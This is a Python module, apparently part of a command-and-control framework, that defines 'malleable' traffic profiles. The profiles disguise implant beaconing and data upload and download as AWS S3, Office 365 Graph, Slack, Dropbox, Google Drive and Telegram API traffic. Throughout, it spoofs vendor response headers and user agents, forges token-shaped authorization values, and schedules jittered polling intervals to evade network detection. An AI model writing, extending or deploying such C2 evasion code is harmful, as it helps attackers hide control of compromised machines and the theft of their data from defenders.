#!/usr/bin/env python3
"""
bb_profiles.py — BlackBerry C2 Malleable Traffic Profiles
"""

import json, os, re, copy, random, time, base64
from typing import Optional

# ─────────────────────────────────────────────────────────────────────────────
#  EXPANSION DE TOKENS EN HEADERS/URIs
# ─────────────────────────────────────────────────────────────────────────────

def _rhex(n):    return os.urandom(n).hex()
def _rb64(n):    return base64.urlsafe_b64encode(os.urandom(n)).decode().rstrip("=")
def _ruuid():
    import uuid; return str(uuid.uuid4())
def _aws_date():
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

_TPAT = re.compile(
    r'__RANDOM_HEX_(\d+)__'
    r'|__RANDOM_B64_(\d+)__'
    r'|__RANDOM_UUID__'
    r'|__RANDOM_INT_(\d+)_(\d+)__'
    r'|__UNIX_TS__'
    r'|__AWS_DATE__'
    r'|__AWS_TOKEN__'
    r'|__MS_TOKEN__'
    r'|__SLACK_TOKEN__'
    r'|__DBX_TOKEN__'
    r'|__GOOG_TOKEN__'
    r'|__TG_TOKEN__'
)

def _expand(s):
    if not isinstance(s, str): return s
    def _sub(m):
        t = m.group(0)
        if m.group(1):           return _rhex(int(m.group(1)))
        if m.group(2):           return _rb64(int(m.group(2)))
        if t == "__RANDOM_UUID__": return _ruuid()
        if m.group(3):           return str(random.randint(int(m.group(3)), int(m.group(4))))
        if t == "__UNIX_TS__":   return f"{int(time.time())}.{random.randint(100000,999999)}"
        if t == "__AWS_DATE__":  return _aws_date()
        if t == "__AWS_TOKEN__": return "FwoGZXIvYXdzE" + _rb64(180)
        if t == "__MS_TOKEN__":  return "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9." + _rb64(200)
        if t == "__SLACK_TOKEN__": return "xoxb-" + _rhex(12) + "-" + _rhex(12) + "-" + _rb64(24)
        if t == "__DBX_TOKEN__": return "sl.B." + _rb64(80)
        if t == "__GOOG_TOKEN__": return "ya29.a0AfH6SM" + _rb64(80)
        if t == "__TG_TOKEN__":  return f"{random.randint(1000000000,9999999999)}:{_rb64(21)}"
        return t
    return _TPAT.sub(_sub, s)

def _expand_dict(d):
    return {k: _expand(str(v)) for k, v in d.items()}


# ─────────────────────────────────────────────────────────────────────────────
#  PERFILES BUILTIN
# ─────────────────────────────────────────────────────────────────────────────

BUILTIN_PROFILES = {

"aws": {
    "name": "Amazon AWS / S3 / CloudFront",
    "description": "Imita S3, CloudFront CDN y API Gateway",
    "server": {
        "response_headers": {
            "Server":            "AmazonS3",
            "x-amz-request-id":  "__RANDOM_HEX_16__",
            "x-amz-id-2":        "__RANDOM_B64_32__",
            "x-amz-cf-pop":      "IAD89-P3",
            "x-amz-cf-id":       "__RANDOM_B64_28__",
            "x-cache":           "Miss from cloudfront",
            "Via":               "1.1 __RANDOM_HEX_8__.cloudfront.net (CloudFront)",
            "Accept-Ranges":     "bytes",
            "Cache-Control":     "max-age=0, no-cache, no-store"
        },
        "data_encoding":    "body",
        "content_type_up":  "application/octet-stream",
        "content_type_down":"application/octet-stream",
        "status_ok": 200, "status_empty": 204
    },
    "client": {
        "user_agents": [
            "aws-sdk-python/1.35.20 Python/3.12.2 Linux/5.15.0 Botocore/1.35.20",
            "aws-sdk-java/2.21.46 Linux/5.15.0 OpenJDK_64-Bit_Server_VM/17.0.9",
            "Boto3/1.34.49 Python/3.11.8 Linux/6.5.0",
            "aws-cli/2.15.30 Python/3.11.8 Linux/5.15.0",
        ],
        "uris": {
            "handshake":     ["/__aws_init", "/v2/auth/init", "/api/authenticate"],
            "polling":       ["/v2/jobs/pending", "/{BUCKET}/notifications", "/sqs/v2/queues/updates"],
            "upload":        ["/{BUCKET}/{KEY}", "/s3/upload/{KEY}", "/v2/data/push/{KEY}"],
            "download":      ["/{BUCKET}/payload/{KEY}", "/v2/data/fetch/{KEY}"],
            "message":       ["/api/v1/messages", "/{BUCKET}/sync/{KEY}", "/v2/sync"],
            "file_transfer": ["/{BUCKET}/files/{KEY}", "/multipart/{KEY}"]
        },
        "uri_vars": {
            "BUCKET": ["corp-assets-7f2a", "backup-store-prod", "sync-data-east1"],
            "KEY":    ["__RANDOM_HEX_8__", "obj/__RANDOM_HEX_6__", "tmp/__RANDOM_HEX_10__"]
        },
        "static_headers": {
            "x-amz-content-sha256": "UNSIGNED-PAYLOAD",
            "x-amz-date":           "__AWS_DATE__",
            "Authorization":        "AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/__RANDOM_HEX_4__/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-date, Signature=__RANDOM_HEX_32__"
        },
        "cookie_fields":       {},
        "data_in":             "body",
        "json_wrap_template":  None,
        "json_wrap_field":     "data",
        "intervals_ms":        {"min": 8000, "max": 35000},
        "jitter_pct":          30,
        "http_method_poll":    "GET",
        "http_method_upload":  "PUT"
    }
},

"office365": {
    "name": "Microsoft Office 365 / Graph API",
    "description": "Imita Microsoft Graph API, SharePoint Online y OneDrive",
    "server": {
        "response_headers": {
            "Server":             "Microsoft-IIS/10.0",
            "request-id":         "__RANDOM_UUID__",
            "client-request-id":  "__RANDOM_UUID__",
            "x-ms-ags-diagnostic":'{"ServerInfo":{"DataCenter":"East US","Slice":"E","Ring":"3"}}',
            "x-ms-request-id":    "__RANDOM_UUID__",
            "Strict-Transport-Security": "max-age=31536000",
            "Cache-Control":      "private",
            "OData-Version":      "4.0"
        },
        "data_encoding":    "json_field",
        "json_field_name":  "value",
        "content_type_up":  "application/json",
        "content_type_down":"application/json; odata.metadata=minimal",
        "status_ok": 200, "status_empty": 204
    },
    "client": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
            "OneDriveSyncClient/23.196.0924.0005 (Windows NT 10.0; Win64; x64)",
            "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17328; Pro)",
            "Teams/1.6.00.26474 Electron/22.3.27 Microsoft Teams"
        ],
        "uris": {
            "handshake":     ["/v1.0/oauth2/v2.0/token", "/v1.0/me/authentication"],
            "polling":       ["/v1.0/me/mailFolders/inbox/messages", "/v1.0/me/calendar/events", "/v1.0/me/drive/recent"],
            "upload":        ["/v1.0/me/drive/root:/{FILE}:/content", "/v1.0/sites/{SITE}/lists/{LIST}/items"],
            "download":      ["/v1.0/me/drive/items/{ITEM}/content"],
            "message":       ["/v1.0/me/sendMail", "/v1.0/chats/{CHAT}/messages"],
            "file_transfer": ["/v1.0/me/drive/root:/{FILE}:/createUploadSession"]
        },
        "uri_vars": {
            "FILE":  ["report___RANDOM_HEX_4__.xlsx", "backup___RANDOM_HEX_4__.zip"],
            "SITE":  ["root"],
            "LIST":  ["Documents", "Tasks"],
            "ITEM":  ["__RANDOM_HEX_16__"],
            "CHAT":  ["19:__RANDOM_HEX_16__@thread.v2"]
        },
        "static_headers": {
            "Authorization":      "Bearer __MS_TOKEN__",
            "Accept":             "application/json",
            "client-request-id":  "__RANDOM_UUID__",
            "SdkVersion":         "Graph-python-1.0.0"
        },
        "cookie_fields":       {},
        "data_in":             "json_field",
        "json_wrap_template":  {"@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users", "value": None},
        "json_wrap_field":     "value",
        "intervals_ms":        {"min": 15000, "max": 60000},
        "jitter_pct":          25,
        "http_method_poll":    "GET",
        "http_method_upload":  "POST"
    }
},

"slack": {
    "name": "Slack Web API",
    "description": "Imita la API Web de Slack — mensajes, archivos y RTM",
    "server": {
        "response_headers": {
            "Server":              "apache",
            "x-slack-req-id":      "__RANDOM_HEX_32__",
            "x-content-type-options": "nosniff",
            "x-xss-protection":    "0",
            "referrer-policy":     "no-referrer",
            "access-control-allow-origin": "*"
        },
        "data_encoding":    "json_field",
        "json_field_name":  "payload",
        "content_type_up":  "application/json; charset=utf-8",
        "content_type_down":"application/json; charset=utf-8",
        "status_ok": 200, "status_empty": 200
    },
    "client": {
        "user_agents": [
            "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 Slack/4.36.134",
            "Slack_SSB/4.36.134 (win32; x64) Electron/28.1.4"
        ],
        "uris": {
            "handshake":     ["/api/rtm.connect", "/api/auth.test"],
            "polling":       ["/api/rtm.start", "/api/conversations.history", "/api/apps.connections.open"],
            "upload":        ["/api/chat.postMessage", "/api/files.getUploadURLExternal"],
            "download":      ["/api/conversations.replies", "/api/files.info"],
            "message":       ["/api/chat.postMessage", "/api/chat.update"],
            "file_transfer": ["/api/files.completeUploadExternal", "/api/files.upload"]
        },
        "uri_vars": {},
        "static_headers": {
            "Authorization":  "Bearer __SLACK_TOKEN__",
            "Accept":         "application/json",
            "Accept-Charset": "utf-8"
        },
        "cookie_fields": {
            "d": "__RANDOM_HEX_32__",
            "b": "__RANDOM_HEX_16__"
        },
        "data_in":             "json_field",
        "json_wrap_template":  {"ok": True, "channel": "C__RANDOM_HEX_8__", "ts": "__UNIX_TS__", "payload": None},
        "json_wrap_field":     "payload",
        "intervals_ms":        {"min": 3000, "max": 12000},
        "jitter_pct":          20,
        "http_method_poll":    "GET",
        "http_method_upload":  "POST"
    }
},

"dropbox": {
    "name": "Dropbox API v2",
    "description": "Imita la API v2 de Dropbox — files, upload sessions, sync",
    "server": {
        "response_headers": {
            "Server":                  "nginx",
            "X-Dropbox-Request-Id":    "__RANDOM_HEX_32__",
            "x-server-response-time":  "__RANDOM_INT_50_300__",
            "x-dropbox-http-protocol": "None",
            "Pragma":                  "no-cache",
            "Cache-Control":           "no-cache"
        },
        "data_encoding":    "body",
        "content_type_up":  "application/octet-stream",
        "content_type_down":"application/json",
        "status_ok": 200, "status_empty": 200
    },
    "client": {
        "user_agents": [
            "dbxdesktop/DBX-Win-3.25.7.10737 (Windows 10.0)",
            "dropbox-sdk-python/11.36.2 Python/3.11.8",
            "Dropbox iOS/264.1.2 iOS/17.2 like Mac OS X",
            "Dropbox Android/325.2.5 Android/13 (API 33)"
        ],
        "uris": {
            "handshake":     ["/2/auth/token/from_oauth1", "/2/users/get_current_account"],
            "polling":       ["/2/files/list_folder/longpoll", "/2/files/list_folder/continue", "/2/longpoll_delta"],
            "upload":        ["/2/files/upload", "/2/files/upload_session/start"],
            "download":      ["/2/files/download", "/2/files/get_thumbnail"],
            "message":       ["/2/files/list_folder", "/2/files/get_metadata"],
            "file_transfer": ["/2/files/upload_session/append_v2", "/2/files/copy_v2"]
        },
        "uri_vars": {},
        "static_headers": {
            "Authorization":   "Bearer __DBX_TOKEN__",
            "Dropbox-API-Arg": '{"path":"/sync/__RANDOM_HEX_8__","mode":"overwrite"}',
            "Accept":          "application/json"
        },
        "cookie_fields":       {},
        "data_in":             "body",
        "json_wrap_template":  None,
        "json_wrap_field":     "entries",
        "intervals_ms":        {"min": 5000, "max": 25000},
        "jitter_pct":          25,
        "http_method_poll":    "POST",
        "http_method_upload":  "POST"
    }
},

"gdrive": {
    "name": "Google Drive API v3",
    "description": "Imita la API de Google Drive v3 — endpoints originales del proxy",
    "server": {
        "response_headers": {
            "Server":              "ESF",
            "Vary":                "Origin, X-Origin",
            "x-content-type-options": "nosniff",
            "x-frame-options":     "SAMEORIGIN",
            "x-xss-protection":    "0",
            "Alt-Svc":             "h3=\":443\"; ma=2592000"
        },
        "data_encoding":    "body",
        "content_type_up":  "application/octet-stream",
        "content_type_down":"application/json; charset=UTF-8",
        "status_ok": 200, "status_empty": 204
    },
    "client": {
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "google-api-python-client/2.115.0 (gzip)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"
        ],
        "uris": {
            "handshake":     ["/handshake"],
            "polling":       ["/drive/v3/files"],
            "upload":        ["/upload/drive/v3/files"],
            "download":      ["/drive/v3/files"],
            "message":       ["/api/v1/sync"],
            "file_transfer": ["/content/upload"]
        },
        "uri_vars": {},
        "static_headers": {
            "Authorization": "Bearer __GOOG_TOKEN__",
            "Accept":        "application/json"
        },
        "cookie_fields":       {},
        "data_in":             "body",
        "json_wrap_template":  None,
        "json_wrap_field":     "data",
        "intervals_ms":        {"min": 5000, "max": 30000},
        "jitter_pct":          20,
        "http_method_poll":    "GET",
        "http_method_upload":  "POST"
    }
},

"telegram": {
    "name": "Telegram Bot API",
    "description": "Imita polling y mensajes de la API de Telegram Bots",
    "server": {
        "response_headers": {
            "Server":                    "nginx/1.18.0",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains"
        },
        "data_encoding":    "json_field",
        "json_field_name":  "result",
        "content_type_up":  "application/json",
        "content_type_down":"application/json",
        "status_ok": 200, "status_empty": 200
    },
    "client": {
        "user_agents": [
            "python-telegram-bot/20.7 (https://python-telegram-bot.org)",
            "Mozilla/5.0 (compatible; TelegramBot/1.0; +https://core.telegram.org/bots)"
        ],
        "uris": {
            "handshake":     ["/bot{TOKEN}/getMe",      "/bot{TOKEN}/deleteWebhook"],
            "polling":       ["/bot{TOKEN}/getUpdates", "/bot{TOKEN}/getWebhookInfo"],
            "upload":        ["/bot{TOKEN}/sendDocument", "/bot{TOKEN}/sendMessage"],
            "download":      ["/bot{TOKEN}/getFile",    "/file/bot{TOKEN}/{FID}"],
            "message":       ["/bot{TOKEN}/sendMessage","/bot{TOKEN}/editMessageText"],
            "file_transfer": ["/bot{TOKEN}/sendDocument"]
        },
        "uri_vars": {
            "TOKEN": ["__TG_TOKEN__"],
            "FID":   ["AgACAgIAAxkBAAI__RANDOM_HEX_8__"]
        },
        "static_headers": {},
        "cookie_fields":       {},
        "data_in":             "json_field",
        "json_wrap_template":  {"ok": True, "result": None},
        "json_wrap_field":     "result",
        "intervals_ms":        {"min": 1000, "max": 5000},
        "jitter_pct":          15,
        "http_method_poll":    "GET",
        "http_method_upload":  "POST"
    }
}

}  # /BUILTIN_PROFILES


# ─────────────────────────────────────────────────────────────────────────────
#  CLASE TrafficProfile
# ─────────────────────────────────────────────────────────────────────────────

class TrafficProfile:
    def __init__(self, data: dict):
        self._raw = copy.deepcopy(data)
        self.name = data.get("name", "unknown")
        self.desc        = data.get("description", "")
        self.description = self.desc          # alias
        self._srv = data.get("server", {})
        self._cli = data.get("client", {})

    # ── Servidor ─────────────────────────────────────────────────────────────

    def response_headers(self) -> dict:
        return _expand_dict(dict(self._srv.get("response_headers", {})))

    def server_encoding(self) -> str:
        return self._srv.get("data_encoding", "body")

    def server_json_field(self) -> str:
        return self._srv.get("json_field_name", "data")

    def ct_upload(self) -> str:
        return self._srv.get("content_type_up", "application/octet-stream")

    def ct_download(self) -> str:
        return self._srv.get("content_type_down", "application/octet-stream")

    def status_ok(self) -> int:  return self._srv.get("status_ok", 200)
    def status_empty(self) -> int: return self._srv.get("status_empty", 204)

    def wrap_for_client(self, raw: bytes) -> tuple:
        """Envuelve datos del servidor para el cliente."""
        if self.server_encoding() == "json_field":
            field = self.server_json_field()
            obj = {field: base64.b64encode(raw).decode(), "ok": True}
            return json.dumps(obj).encode(), "application/json"
        return raw, self.ct_download()

    def unwrap_from_client(self, body: bytes) -> bytes:
        """Desenvuelve datos del cliente al servidor."""
        if self.server_encoding() == "json_field":
            try:
                obj   = json.loads(body)
                field = self.server_json_field()
                val   = obj.get(field, "")
                if isinstance(val, str):
                    return base64.b64decode(val + "==")
            except Exception:
                pass
        return body

    # ── Cliente ───────────────────────────────────────────────────────────────

    def user_agent(self) -> str:
        return random.choice(self._cli.get("user_agents", ["Mozilla/5.0"]))

    def uri_for(self, task: str) -> str:
        pool  = self._cli.get("uris", {}).get(task) or \
                self._cli.get("uris", {}).get("message") or ["/api/sync"]
        uri   = random.choice(pool)
        uvars = self._cli.get("uri_vars", {})
        def _sv(m):
            var = m.group(1)
            return _expand(random.choice(uvars.get(var, [f"__{var}__"])))
        return re.sub(r"\{([A-Z_]+)\}", _sv, uri)

    def all_uris_flat(self) -> list:
        """Lista de {path, task, desc} para cargar en el proxy."""
        eps, seen = [], set()
        for task, pool in self._cli.get("uris", {}).items():
            for uri in pool:
                clean = re.sub(r"\{[A-Z_]+\}", "*", uri)
                if clean in seen: continue
                seen.add(clean)
                eps.append({"path": clean, "task": task, "desc": f"[{self.name}] {task}"})
        return eps

    def static_headers(self) -> dict:
        return _expand_dict(dict(self._cli.get("static_headers", {})))

    def cookie_header(self) -> str:
        cf = self._cli.get("cookie_fields", {})
        if not cf: return ""
        return "; ".join(f"{k}={_expand(v)}" for k, v in cf.items())

    def build_headers(self, session_id: str = "") -> dict:
        h = {}
        h.update(self.static_headers())
        if session_id:
            h["X-Session-ID"] = session_id
        ck = self.cookie_header()
        if ck:
            h["Cookie"] = ck
        h["User-Agent"] = self.user_agent()
        return h

    def client_encoding(self) -> str:
        return self._cli.get("data_in", "body")

    def wrap_for_server(self, raw: bytes) -> tuple:
        """Envuelve datos del cliente para enviar al proxy."""
        if self.client_encoding() == "json_field":
            tmpl  = copy.deepcopy(self._cli.get("json_wrap_template") or {})
            field = self._cli.get("json_wrap_field", "data")
            tmpl  = {k: (_expand(str(v)) if v is not None else None) for k, v in tmpl.items()}
            tmpl[field] = base64.b64encode(raw).decode()
            return json.dumps(tmpl).encode(), self.ct_upload()
        return raw, "application/octet-stream"

    def unwrap_from_server(self, body: bytes) -> bytes:
        """Desenvuelve datos del proxy al cliente."""
        if self.client_encoding() == "json_field":
            try:
                obj   = json.loads(body)
                field = self._cli.get("json_wrap_field", "data")
                val   = obj.get(field, "")
                if isinstance(val, str):
                    return base64.b64decode(val + "==")
            except Exception:
                pass
        return body

    def interval_ms(self) -> int:
        lo  = self._cli.get("intervals_ms", {}).get("min", 5000)
        hi  = self._cli.get("intervals_ms", {}).get("max", 30000)
        jp  = self._cli.get("jitter_pct", 20)
        base = random.randint(lo, hi)
        jit  = int(base * (jp / 100.0) * (random.random() * 2 - 1))
        return max(1000, base + jit)

    def http_method_poll(self) -> str:
        return self._cli.get("http_method_poll", "GET")

    def http_method_upload(self) -> str:
        return self._cli.get("http_method_upload", "POST")

    def to_dict(self) -> dict:
        return copy.deepcopy(self._raw)

    def match_task(self, path: str):
        """
        Devuelve (task, True) si el path coincide con alguna URI del perfil,
        o (None, False) si no coincide. Útil para que el proxy resuelva
        rutas malleable sin tener que cargar endpoints manualmente.
        Matching: exacto → por prefijo hasta variable → por sufijo de basename.
        """
        uris = self._cli.get("uris", {})
        task_map = {
            "handshake": "handshake", "polling": "polling",
            "upload": "upload",       "download": "download",
            "message": "message",     "file_transfer": "file_transfer",
        }
        # 1. Coincidencia exacta en algún pool
        for task, pool in uris.items():
            for uri in pool:
                # Resolver variables a regex: {VAR} → [^/]+
                pat = re.sub(r"\{[A-Z_]+\}", "[^/]+", re.escape(uri).replace("\\*", ".*"))
                if re.fullmatch(pat, path):
                    return task_map.get(task, "message"), True
        # 2. Coincidencia por cualquier segmento fijo de la URI
        #    (permite /2023-11-30/handshake → match "handshake" segmento)
        path_segs = set(p for p in path.split("/") if p)
        for task, pool in uris.items():
            for uri in pool:
                # Segmentos fijos (sin variables {VAR})
                uri_segs = [p for p in uri.split("/") if p and "{" not in p]
                if uri_segs and any(seg in path_segs for seg in uri_segs):
                    return task_map.get(task, "message"), True
        return None, False

    # ── Aliases para compatibilidad con proxy/cliente modificados ─────────────
    def uri_for_task(self, task):      return self.uri_for(task)
    def all_uris(self):                return dict(self._cli.get("uris", {}))
    def data_encoding(self):           return self.client_encoding()
    def server_data_encoding(self):    return self.server_encoding()
    def wrap_data_client(self, raw):   return self.wrap_for_server(raw)
    def unwrap_data_server(self, body): return self.unwrap_from_server(body)
    def wrap_data_server(self, raw):   return self.wrap_for_client(raw)
    def unwrap_data_client(self, body, ct=""): return self.unwrap_from_client(body)
    def content_type_download(self):   return self.ct_download()
    def content_type_upload(self):     return self.ct_upload()
    def response_headers(self):        return _expand_dict(dict(self._srv.get("response_headers", {})))

    def summary(self) -> str:
        L = [f"{'─'*56}", f"  {self.name}", f"  {self.desc}", f"{'─'*56}", "",
             "  USER-AGENTS:"]
        for ua in self._cli.get("user_agents", []):
            L.append(f"    • {ua[:72]}")
        L += ["", "  URIs POR TAREA:"]
        for task, pool in self._cli.get("uris", {}).items():
            L.append(f"    [{task}]")
            for u in pool[:2]:  L.append(f"      {u}")
        L += ["", "  HEADERS ESTÁTICOS (cliente):"]
        for k, v in self._cli.get("static_headers", {}).items():
            L.append(f"    {k}: {str(v)[:55]}…")
        L += ["",
              f"  ENCODING CLIENTE → SERVIDOR: {self.client_encoding()}",
              f"  ENCODING SERVIDOR → CLIENTE: {self.server_encoding()}",
              ""]
        iv = self._cli.get("intervals_ms", {})
        L.append(f"  INTERVALOS  {iv.get('min',5000)}-{iv.get('max',30000)} ms  "
                 f"jitter {self._cli.get('jitter_pct',20)}%")
        L += ["", "  HEADERS DE RESPUESTA (servidor):"]
        for k, v in self._srv.get("response_headers", {}).items():
            L.append(f"    {k}: {str(v)[:55]}")
        return "\n".join(L)


# ─────────────────────────────────────────────────────────────────────────────
#  GESTIÓN DE PERFILES
# ─────────────────────────────────────────────────────────────────────────────

_PROFILES_DIR = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "config", "profiles")


def list_profiles() -> dict:
    result = {k: v["name"] for k, v in BUILTIN_PROFILES.items()}
    if os.path.isdir(_PROFILES_DIR):
        for fn in sorted(os.listdir(_PROFILES_DIR)):
            if fn.endswith((".json", ".yaml", ".yml")):
                pid = fn.rsplit(".", 1)[0]
                try:
                    p = load_profile(pid); result[pid] = p.name + "  ★"
                except Exception:
                    pass
    return result


def load_profile(pid: str) -> TrafficProfile:
    if pid in BUILTIN_PROFILES:
        return TrafficProfile(BUILTIN_PROFILES[pid])
    if os.path.isdir(_PROFILES_DIR):
        for ext in ("json", "yaml", "yml"):
            path = os.path.join(_PROFILES_DIR, f"{pid}.{ext}")
            if os.path.isfile(path):
                return _load_file(path)
    raise ValueError(f"Perfil '{pid}' no encontrado. Disponibles: {list(list_profiles())}")


def _load_file(path: str) -> TrafficProfile:
    with open(path, "r", encoding="utf-8") as f:
        if path.endswith((".yaml", ".yml")):
            try:
                import yaml; data = yaml.safe_load(f)
            except ImportError:
                raise ImportError("pip install pyyaml  para perfiles YAML")
        else:
            data = json.load(f)
    return TrafficProfile(data)


def save_profile(pid: str, data: dict) -> str:
    os.makedirs(_PROFILES_DIR, exist_ok=True)
    path = os.path.join(_PROFILES_DIR, f"{pid}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return path


def delete_profile(pid: str) -> bool:
    if pid in BUILTIN_PROFILES:
        raise ValueError("No se pueden eliminar perfiles builtin")
    for ext in ("json", "yaml", "yml"):
        path = os.path.join(_PROFILES_DIR, f"{pid}.{ext}")
        if os.path.isfile(path):
            os.remove(path); return True
    return False


# ─────────────────────────────────────────────────────────────────────────────
#  SINGLETON GLOBAL (para proxy y cliente)
# ─────────────────────────────────────────────────────────────────────────────

_active: TrafficProfile = TrafficProfile(BUILTIN_PROFILES["gdrive"])
_active_id: str         = "gdrive"


def get_active_profile() -> TrafficProfile:  return _active
def get_active_id() -> str:                  return _active_id
def get_active_profile_id() -> str:          return _active_id


def profile_endpoints_for_proxy(profile: TrafficProfile) -> list:
    """Genera {path,task,desc} para cargar en proxy_config."""
    return profile.all_uris_flat()


def build_client_headers(profile: TrafficProfile, session_id: str = "",
                         extra: dict = None) -> dict:
    """Construye headers HTTP del cliente con el perfil activo."""
    h = profile.build_headers(session_id)
    if extra: h.update(extra)
    return h


def set_active_profile(pid: str) -> TrafficProfile:
    global _active, _active_id
    _active    = load_profile(pid)
    _active_id = pid
    return _active


if __name__ == "__main__":
    print("=== Perfiles disponibles ===\n")
    for pid, pname in list_profiles().items():
        p = load_profile(pid)
        print(f"  {pid:<12}  {pname}")
        print(f"             UA:        {p.user_agent()[:65]}")
        print(f"             Handshake: {p.uri_for('handshake')}")
        print(f"             Poll:      {p.uri_for('polling')}")
        print(f"             Encoding:  {p.client_encoding()} / {p.server_encoding()}")
        print()
